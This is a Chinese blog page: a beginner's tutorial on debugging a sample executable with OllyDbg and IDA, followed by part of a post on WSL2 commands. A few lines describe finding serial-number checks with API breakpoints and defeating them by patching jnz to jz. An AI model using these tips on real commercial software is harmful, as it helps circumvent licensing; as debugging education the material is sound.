<h3 id="查看快捷键">查看快捷键</h3>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707165636208.png"
alt="image-20220707165636208" />'</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707171131310.png"
alt="image-20220707171131310" />
<figcaption aria-hidden="true">image-20220707171131310</figcaption>
</figure>
<h4 id="ctrlg跳转">ctrl+G跳转</h4>
<p>用ida静态分析时,我们知道WinMain函数的起始地址在<code>0x00401080</code></p>
<p>可以使用ctrl+G打开跟随窗口进行跳转</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707161059609.png"
alt="image-20220707161059609" />
<figcaption aria-hidden="true">image-20220707161059609</figcaption>
</figure>
<p>回车之后就跳转到该位置</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707161215951.png"
alt="image-20220707161215951" />
<figcaption aria-hidden="true">image-20220707161215951</figcaption>
</figure>
<p>还可以跟踪一个函数,比如API函数<code>MessageBoxA</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707161728342.png"
alt="image-20220707161728342" />
<figcaption aria-hidden="true">image-20220707161728342</figcaption>
</figure>
<p>双击右侧列表中的<code>MessageBoxA</code>之后,反汇编窗口自动跳转到该<strong>函数实现</strong>的入口</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707161815928.png"
alt="image-20220707161815928" />
<figcaption aria-hidden="true">image-20220707161815928</figcaption>
</figure>
<p>一看地址好家伙都到<code>0x75539096</code>了,</p>
<p>而ida静态分析时的地址最大才到<code>.data:0040338C</code>,不用ctrl+G,只拖动od反汇编窗口的滑块,也是最大可以看到401FFF,后面就一片空白了,就好像od懒得干活了一样</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707162547049.png"
alt="image-20220707162547049" />
<figcaption aria-hidden="true">image-20220707162547049</figcaption>
</figure>
<p><code>0x75539096</code>这个地址是啥呢?为什么会这么大?</p>
<p>一开始我还认为这是内核的地址空间,实际上不是,这个值还是在<code>0 - 0x7FFFFFFF</code>范围内的,是用户地址空间</p>
<blockquote>
<p>地址范围 0 - 0x7FFFFFFF（2G），运行</p>
<p>应用程序代码、数据等等。</p>
<p>2.2.1 空指针区(NULL区)</p>
<p>地址范围 0 - 0x0000FFFF</p>
<p>2.2.2 用户区</p>
<p>地址范围 0x00010000 - 0x7FFEFFFF</p>
<p>2.2.3 64K禁入区</p>
<p>地址范围 0x7FFEFFFF - 0x7FFFFFFF</p>
<p>2.2 内核空间</p>
<p>地址范围 0x80000000 - 0xFFFFFFFF，被</p>
<p>系统使用，运行驱动、内核的数据和代码。</p>
</blockquote>
<p>猜测这是DLL库,但是具体是不是,需要学习了windows上的链接阶段再说</p>
<h4 id="alte查看模块">alt+e查看模块</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707164553789.png"
alt="image-20220707164553789" />
<figcaption aria-hidden="true">image-20220707164553789</figcaption>
</figure>
<p>刚才的问题<code>0x75539096</code>这个地址就属于user32.dll模块</p>
<h3 id="调试快捷键">调试快捷键</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707165555280.png"
alt="image-20220707165555280" />
<figcaption aria-hidden="true">image-20220707165555280</figcaption>
</figure>
<h4 id="运行"><strong>运行</strong></h4>
<p>按下F9之后,程序会在第一个断点处停下,如果没有任何断点,程序也没有错误则程序直接执行完毕</p>
<h4 id="步入和步过的区别"><strong>步入和步过的区别:</strong></h4>
<p>对于函数调用,步入则反汇编窗口会跳转跟随该函数,一行一行执行.</p>
<p>而步过则是直接让函数执行完毕,反汇编窗口不会跟随函数,但是保留函数产生的影响,比如寄存器和一些全局变量等的值变化</p>
<h4 id="执行到返回"><strong>执行到返回:</strong></h4>
<p>本来步入了一个函数,后来看烦了想跳出这个函数,就用执行到结束</p>
<p>或者一个需要114514次的大循环,已经循环到第10次了,后面还要循环114504次,烦死了,直接执行到结束跳出循环</p>
<p>函数中的循环则只跳出一层,再按一次执行到返回才会跳出函数</p>
<h4 id="单步和自动的区别"><strong>单步和自动的区别:</strong></h4>
<p>单步是拨一拨转一转,按一下F7或者F8才会执行一行,</p>
<p>自动是按下ctrl+F7或者ctrl+F8之后,od就会像过电影一样自动呼呼地执行,反汇编窗口等四个窗口都会实时跟随更新,相当于一直按着F7或者F8</p>
<p>啥时候自动的能停下呢?</p>
<blockquote>
<p>- 按 Esc 键或发出任何单步命令</p>
<p>- OllyDbg 遇到断点</p>
<p>- 被调试程序发生异常</p>
</blockquote>
<h4 id="执行到用户代码"><strong>执行到用户代码:</strong></h4>
<p>如果当前正在库函数中跑,按下Alt+F9之后,od会在第一条回归到用户自己写的函数中的位置停下</p>
<h3 id="插件">插件</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707171738040.png"
alt="image-20220707171738040" />
<figcaption aria-hidden="true">image-20220707171738040</figcaption>
</figure>
<p>我这个ollydbg是从吾爱破解论坛上下载的懒人包,里面已经集成了一些插件</p>
<h4 id="bp-olly">+BP-OLLY</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172112679.png"
alt="image-20220707172112679" />
<figcaption aria-hidden="true">image-20220707172112679</figcaption>
</figure>
<p>这是一个小工具栏</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172151132.png"
alt="image-20220707172151132" />
<figcaption aria-hidden="true">image-20220707172151132</figcaption>
</figure>
<p>我的懒人包ollydbg启动时这个插件会自启动</p>
<p><strong>其中BP是BreakPoint断点的缩写,作用是在API函数上下断点</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172244773.png"
alt="image-20220707172244773" />
<figcaption aria-hidden="true">image-20220707172244773</figcaption>
</figure>
<p><strong>P是编辑命令快捷键</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172412802.png"
alt="image-20220707172412802" />
<figcaption aria-hidden="true">image-20220707172412802</figcaption>
</figure>
<p>比如BP
MessageBoxA就相当于保存了一条命令,下一次只需要点击一下就可以自动让od执行该命令</p>
<p>实际作用和在ollydbg的底行输入命令回车执行相同</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172511015.png"
alt="image-20220707172511015" />
<figcaption aria-hidden="true">image-20220707172511015</figcaption>
</figure>
<p>这里Command还能干啥呢?现在不想炎鸠</p>
<p><strong>VB也是在一些库函数上下断点,但是这些库函数目前没有遭遇过</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172623275.png"
alt="image-20220707172623275" />
<figcaption aria-hidden="true">image-20220707172623275</figcaption>
</figure>
<p>NotePad,调用windows系统自带的记事本程序</p>
<p>Calc,调用计算器</p>
<p>Folder,打开exployer文件系统资源管理器</p>
<p>CMD,打开命令提示符</p>
<p>Exit,关闭该插件</p>
<h4 id="api断点">API断点</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707171843420.png"
alt="image-20220707171843420" />
<figcaption aria-hidden="true">image-20220707171843420</figcaption>
</figure>
<p>这两个插件的功能差不多,都是让od自动找到我们调用API函数的地方下断点</p>
<p>比如<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707171936097.png"
alt="image-20220707171936097" /></p>
<p>在GetWindowTextA处下断点,这个API的作用是获取用户在窗口中的文本框输入.</p>
<p>一些序列号注册验证逻辑往往就发生在获取用户输入之后,让od自动停在这种地方,方便我们单步调试后面的逻辑</p>
<h4 id="花里胡哨的插件">花里胡哨的插件</h4>
<p>这些插件我都没用到过,它们描述的功能,什么"花指令",什么"反混淆",看上去好高深,现在不想炎鸠</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172857063.png"
alt="image-20220707172857063" />
<figcaption aria-hidden="true">image-20220707172857063</figcaption>
</figure>
<h4 id="中文搜索引擎">中文搜索引擎</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172950546.png"
alt="image-20220707172950546" />
<figcaption aria-hidden="true">image-20220707172950546</figcaption>
</figure>
<p>搜索UNICODE之后的结果</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707173009685.png"
alt="image-20220707173009685" />
<figcaption aria-hidden="true">image-20220707173009685</figcaption>
</figure>
<p>其作用相当于二进制工具Strings</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\bin\binarybook\chap01\wsample01b\release&gt; strings wsample01b.exe -d -eb</span><br><span class="line">\wsample01b.exe</span><br><span class="line">MESSAGE</span><br><span class="line">Copied!</span><br></pre></td></tr></table></figure>
<p>-d选项只扫描.data区,</p>
<p>-e选项指定字符宽度,b或者l表示16字节即一个宽字符unicode</p>
<h4 id="自动注释">自动注释</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707173038785.png"
alt="image-20220707173038785" />
<figcaption aria-hidden="true">image-20220707173038785</figcaption>
</figure>
<p>差评,<strong>这个插件根本跑不起来</strong>,现有的注释不是插件带来的,是od自带的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707173157070.png"
alt="image-20220707173157070" />
<figcaption aria-hidden="true">image-20220707173157070</figcaption>
</figure>
<p>这些注释已经足够看懂程序了</p>
<h3 id="动态调试">动态调试</h3>
<p>正儿八经开始调试这个wsample01b.exe</p>
<p>由于od自动在最顶上一行0x401000下了断点,此处正好是sub_401000函数入口,直接F9运行观察该函数的行为</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707184836611.png"
alt="image-20220707184836611" />
<figcaption aria-hidden="true">image-20220707184836611</figcaption>
</figure>
<p>开始运行时,程序会停止在第一个断点0x401000处,当前停止位置会有灰色高亮</p>
<p>左上角"暂停"表明当前调试器的状态</p>
<p>寄存器区的表现为:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707185010444.png"
alt="image-20220707185010444" />
<figcaption aria-hidden="true">image-20220707185010444</figcaption>
</figure>
<p>其中红色的是有变化的寄存器,刚开始执行一个程序,各个通用目的寄存器还有栈顶指针,帧指针等等都认为有变化</p>
<p>其中</p>
<p>eip=0x401000表明将要执行的指令地址</p>
<p>esp=0x0019FEE0表明当前栈顶指针位置</p>
<p>由于还没有经历sub_401000的开端,<strong>ebp=0x0019FF74这个值是谁的栈帧指针呢?</strong></p>
<p><strong>啃腚不是winmain的!啃腚不是winmain的!啃腚不是winmain的!</strong></p>
<p>说三遍是因为一开始瞎几把分析都认为是winmain的帧指针了</p>
<p>winmain函数满足stdcall调用约定,不会使用栈帧指针ebp,那么此ebp<strong>有可能</strong>是winmain的调用者的帧指针,也不一定,要是调用者也是stdcall,则ebp还得往前找</p>
<p>谁调用了winmain呢?这个问题可以在ida的function calls中观察</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707192428834.png"
alt="image-20220707192428834" />
<figcaption aria-hidden="true">image-20220707192428834</figcaption>
</figure>
<p>也可以在目前的栈帧中观察winmain的返回地址</p>
<p>栈帧区的表现为</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707185758156.png"
alt="image-20220707185758156" />
<figcaption aria-hidden="true">image-20220707185758156</figcaption>
</figure>
<p>紫色高亮是手动选中的,栈顶指针在<code>0x19FEE0</code>,会有类似反汇编区中将要执行指令的灰色高亮</p>
<p>由于控制已经转到sub_401000的第一条指令,这表明,winmain中的<code>call sub_401000</code>已经执行过了,</p>
<p>因此sub_401000的返回地址<code>0x401085</code>已经压入栈中<code>0x19FEE0</code>位置</p>
<blockquote>
<p>ida观察这件事,确实call指令下面一条指令的地址就是0x401085</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401080                 call    sub_401000</span><br><span class="line">.text:00401085                 push    0               ; uType</span><br></pre></td></tr></table></figure>
</blockquote>
<p>注意到还有另一个<code>返回到 wsample0.00401255 来自 wsample0.00401080</code>,这是啥呢?</p>
<p>这个指令地址在<code>__tmainCRTStartup</code>函数中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401250                 call    _wWinMain@16    ; wWinMain(x,x,x,x)</span><br><span class="line">.text:00401255                 mov     dword_403038, eax</span><br></pre></td></tr></table></figure>
<p>原来是<code>winmain</code>的返回地址,同时也知道了是<code>__tmainCRTStartup</code>这个函数调用了<code>_wWinMain@16</code></p>
<blockquote>
<p>至于<code>__tmainCRTStartup</code>这个函数干了啥呢?我非常好奇,但是现在不是炎鸠它的时候,后面专门炎鸠win32程序调用的全过程</p>
</blockquote>
<p>下面接着两条指令都是mov指令,不涉及函数调用,因此单步步入和单步步过没有区别</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707190703773.png"
alt="image-20220707190703773" />
<figcaption aria-hidden="true">image-20220707190703773</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707191307452.png"
alt="image-20220707191307452" />
<figcaption aria-hidden="true">image-20220707191307452</figcaption>
</figure>
<p>这大概就是调试过程</p>
<h3 id="调试时修改">调试时修改</h3>
<h4 id="改指令">改指令</h4>
<p>反汇编区,任意一行汇编指令都是可以修改的,双击即可修改</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707193913865.png"
alt="image-20220707193913865" />
<figcaption aria-hidden="true">image-20220707193913865</figcaption>
</figure>
<p>一定要选择使用NOP填充,因为运行时各种寻址已经确定,如果我们修改的汇编指令比原指令短,则从该指令以后的所有指令地址都会移动,各种寻址方式就寄了</p>
<p>这里修改指令带来的影响是永久的,即直接修改了可执行文件中的二进制代码,下一次运行本程序还会带着本次的修改</p>
<p>破解序列号注册程序时往往把jnz改成jz就可以让序列号判断寄掉</p>
<h4 id="改寄存器">改寄存器</h4>
<p>比如修改状态寄存器ZF,双击其数值就可以从0改到1或者从1改到0,后续的计算都是基于修改后的值</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707194243839.png"
alt="image-20220707194243839" />
<figcaption aria-hidden="true">image-20220707194243839</figcaption>
</figure>
<p>也可以修改其他寄存器,比如程序计数器esp</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707194718167.png"
alt="image-20220707194718167" />
<figcaption aria-hidden="true">image-20220707194718167</figcaption>
</figure>
<p>修改之后堆栈区的当前栈顶指针也会跟着改</p>
<blockquote>
<p>有一个寄存器没法改,那就是eip程序计数器</p>
</blockquote>
<p>修改寄存器造成的影响是临时的,仅限于本次程序执行,当程序重新执行时没有影响</p>
<h4 id="改堆栈">改堆栈</h4>
<p>比如可以把sub_401000的返回地址改成sub_401000的入口地址,ret2text?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707195024065.png"
alt="image-20220707195024065" />
<figcaption aria-hidden="true">image-20220707195024065</figcaption>
</figure>
<p>改堆栈也是临时的</p>
<h2 id="ida动态调试wsample01b.exe">IDA动态调试wsample01b.exe</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707201135306.png"
alt="image-20220707201135306" />
<figcaption aria-hidden="true">image-20220707201135306</figcaption>
</figure>
<p>首先要选择调试器</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707201155743.png"
alt="image-20220707201155743" />
<figcaption aria-hidden="true">image-20220707201155743</figcaption>
</figure>
<p>说是选择,然而只有一个Local Windows
debugger可以用,其他的都找不到,没安装</p>
<p>选好之后下断点</p>
<p>比如在winmain第一行下断点</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707201428364.png"
alt="image-20220707201428364" />
<figcaption aria-hidden="true">image-20220707201428364</figcaption>
</figure>
<p>此后按下F9就开始动态调试了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707201704143.png"
alt="image-20220707201704143" />
<figcaption aria-hidden="true">image-20220707201704143</figcaption>
</figure>
<p>各种快捷键都与ollydbg相似,包括F7单步步入,F8单步步过等等</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/23/wsl/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/23/wsl/" class="post-title-link" itemprop="url">WSL2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-23 22:44:00" itemprop="dateCreated datePublished" datetime="2022-06-23T22:44:00+08:00">2022-06-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-02 23:13:16" itemprop="dateModified" datetime="2024-09-02T23:13:16+08:00">2024-09-02</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="wsl2">WSL2</h1>
<p>Windows Subsystem for Linux,在windows上运行的linux子系统</p>
<p>前一段时间一直在用WSL
kali+vscode+python3,做pwn的题目还有linux上的逆向题.确实比用vmware开一个虚拟机方便一万倍</p>
<p>但是对wsl的了解也就仅限于一些简单的命令比如<code>ls</code>等等,对于子系统和主系统的网络关系,以及子系统的其他用法,没有了解过</p>
<p>现在想了解一下子系统的结构,怎么用子系统完成操作系统的课程实验(编译内核,系统调用,内核模块,设备驱动)</p>
<p>以及如何修改子系统的各种设置,比如防火墙,与主机的网络关系,网络发现等</p>
<p>随性更新...</p>
<h2 id="安装卸载wsl">安装/卸载wsl</h2>
<h3 id="安装wsl">安装wsl</h3>
<p>后面的实验都是基于WSL2已经安装完成,kali子系统已经能够在终端上运行了.安装wsl可以去微软官网(这部分已经被翻译过了),要添加windows功能</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220622193653802.png"
alt="image-20220622193653802" />
<figcaption aria-hidden="true">image-20220622193653802</figcaption>
</figure>
<p>具体参考<a
target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/wsl/basic-commands">WSL
的基本命令 | Microsoft Docs</a></p>
<p>在微软应用市场上可以下载各种linux系统,比如ubuntu18.04和ubuntu20.04,kali,debian等等</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220622191626686.png"
alt="image-20220622191626686" />
<figcaption aria-hidden="true">image-20220622191626686</figcaption>
</figure>
<p>更方便的方法是在命令行上</p>
<p><strong>查看本机已安装子系统</strong></p>
<p><code>wsl -l</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; wsl <span class="literal">-l</span></span><br><span class="line">适用于 Linux 的 Windows 子系统分发版:</span><br><span class="line">kali<span class="literal">-linux</span> (默认)</span><br><span class="line">Ubuntu</span><br></pre></td></tr></table></figure>
<p><strong>查看可以安装的子系统</strong></p>
<p><code>wsl -l -o</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; wsl <span class="literal">-l</span> <span class="literal">-o</span></span><br><span class="line">以下是可安装的有效分发的列表。</span><br><span class="line">请使用“wsl <span class="literal">--install</span> <span class="literal">-d</span> &lt;分发&gt;”安装。</span><br><span class="line"></span><br><span class="line">NAME            FRIENDLY NAME</span><br><span class="line">Ubuntu          Ubuntu</span><br><span class="line">Debian          Debian GNU/Linux</span><br><span class="line">kali<span class="literal">-linux</span>      Kali Linux Rolling</span><br><span class="line">openS<span class="built_in">USE-42</span>     openSUSE Leap <span class="number">42</span></span><br><span class="line">SLES<span class="literal">-12</span>         SUSE Linux Enterprise Server v12</span><br><span class="line">Ubuntu<span class="literal">-16</span>.<span class="number">04</span>    Ubuntu <span class="number">16.04</span> LTS</span><br><span class="line">Ubuntu<span class="literal">-18</span>.<span class="number">04</span>    Ubuntu <span class="number">18.04</span> LTS</span><br><span class="line">Ubuntu<span class="literal">-20</span>.<span class="number">04</span>    Ubuntu <span class="number">20.04</span> LTS</span><br></pre></td></tr></table></figure>
<p><strong>设置默认的wsl</strong></p>
<p><code>wsl --set-default &lt;子系统名&gt;</code></p>
<p>在powershell中使用wsl命令时,有一个默认使用的子系统,比如我现在默认使用kali-linux,当终端上直接输入wsl时默认唤醒kali-linux,而不是ubuntu</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl --set-default ubuntu</span><br><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl -l</span><br><span class="line">适用于 Linux 的 Windows 子系统分发版:</span><br><span class="line">Ubuntu (默认)</span><br><span class="line">kali-linux</span><br><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl --set-default kali-linux</span><br><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl -l</span><br><span class="line">适用于 Linux 的 Windows 子系统分发版:</span><br><span class="line">kali-linux (默认)</span><br><span class="line">Ubuntu</span><br></pre></td></tr></table></figure>
<h3 id="卸载子系统">卸载子系统</h3>
<p>在微软应用商店里是木法卸载子系统的,在终端上行</p>
<p><code>wsl --unregister &lt;子系统名&gt;</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; wsl <span class="literal">--unregister</span> ubuntu</span><br><span class="line">正在注销...</span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; wsl <span class="literal">-l</span></span><br><span class="line">适用于 Linux 的 Windows 子系统分发版:</span><br><span class="line">kali<span class="literal">-linux</span> (默认)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>三炮!</p>
<p>出去!</p>
</blockquote>
<h2 id="唤醒关闭wsl">唤醒/关闭wsl</h2>
<h3 id="选择唤醒哪一个子系统">选择唤醒哪一个子系统</h3>
<p><code>wsl -d &lt;子系统名&gt;</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; wsl <span class="literal">-d</span> ubuntu</span><br><span class="line">ubuntu@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwn<span class="variable">$</span></span><br></pre></td></tr></table></figure>
<h3 id="选择登录用户">选择登录用户</h3>
<p><code>wsl -u &lt;用户名&gt;</code></p>
<p>比如可以选择使用root登录系统,也可以使用普通用户登录系统.</p>
<p>只要是从powershell上唤醒子系统,不需要输入登录密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl -u root</span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃</span><br><span class="line">┃ This is a minimal installation of Kali Linux, you likely</span><br><span class="line">┃ want to install supplementary tools. Learn how:</span><br><span class="line">┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/</span><br><span class="line">┃</span><br><span class="line">┗━(Run: “touch ~/.hushlogin” to hide this message)</span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn]</span><br><span class="line">└─# exit</span><br><span class="line">logout</span><br><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl -u kali</span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃</span><br><span class="line">┃ This is a minimal installation of Kali Linux, you likely</span><br><span class="line">┃ want to install supplementary tools. Learn how:</span><br><span class="line">┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/</span><br><span class="line">┃</span><br><span class="line">┗━(Run: “touch ~/.hushlogin” to hide this message)</span><br></pre></td></tr></table></figure>
<h3 id="设置默认登录用户">设置默认登录用户</h3>
<p>kali的默认登录用户是普通用户,权限有限.现在想要将默认登录用户改成root,如此不需要su或者sudo再输入密码</p>
<p><code>&lt;子系统名&gt; config --default-user &lt;用户名&gt;</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; kali config <span class="literal">--default-user</span> root</span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; kali</span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃</span><br><span class="line">┃ This is a minimal installation of Kali Linux, you likely</span><br><span class="line">┃ want to install supplementary tools. Learn how:</span><br><span class="line">┃ ⇒ https://www.kali.org/docs/troubleshooting/common<span class="literal">-minimum-setup</span>/</span><br><span class="line">┃</span><br><span class="line">┗━(Run: “touch ~/.hushlogin” to hide this message)</span><br><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<h3
id="查看子系统内核版本wsl---status">查看子系统内核版本<code>wsl --status</code></h3>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; wsl <span class="literal">--status</span></span><br><span class="line">默认分发：kali<span class="literal">-linux</span></span><br><span class="line">默认版本：<span class="number">2</span></span><br><span class="line"></span><br><span class="line">适用于 Linux 的 Windows 子系统最后更新于 <span class="number">2022</span>/<span class="number">4</span>/<span class="number">21</span></span><br><span class="line">适用于 Linux 的 Windows 子系统内核可以使用“wsl <span class="literal">--update</span>”手动更新，但由于你的系统设置，无法进行自动更新。</span><br><span class="line"> 若要接收自动内核更新，请启用 Windows 更新设置:“在更新 Windows 时接收其他 Microsoft 产品的更新”。</span><br><span class="line"> 有关详细信息，请访问https://aka.ms/wsl2kernel。</span><br><span class="line">Windows 更新已暂停。</span><br><span class="line"></span><br><span class="line">内核版本： <span class="number">5.10</span>.<span class="number">102.1</span></span><br></pre></td></tr></table></figure>
<h3 id="子系统关机">子系统关机</h3>
<p>关闭子系统所在的终端并不会关闭wsl,它会在后台运行,因此下一次打开wsl的时候会发现开启的很快.</p>
<p>在powershell上使用<code>wsl --shutdown</code>就可以关闭所有在后台运行的子系统</p>
<p>如果不想关闭所有后台子系统,只停止其中的某一个,可以<code>wsl --terminate &lt;子系统名&gt;</code></p>
<h2 id="工作目录">工作目录</h2>
<h3 id="windows下wsl的位置">windows下wsl的位置</h3>
<p><code>\\wsl.localhost\kali-linux</code></p>
